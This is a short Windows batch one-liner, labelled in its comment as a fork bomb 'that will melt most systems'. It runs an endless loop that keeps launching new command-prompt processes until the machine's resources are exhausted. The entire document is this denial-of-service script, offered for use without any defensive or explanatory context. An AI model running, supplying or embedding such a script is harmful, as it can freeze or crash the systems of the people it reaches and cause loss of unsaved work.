rem one liner forkbomb that will melt most systems
@echo off && for /L %g in (1,0,10) do ( start /I cmd.exe /K set /A m=m+1 )
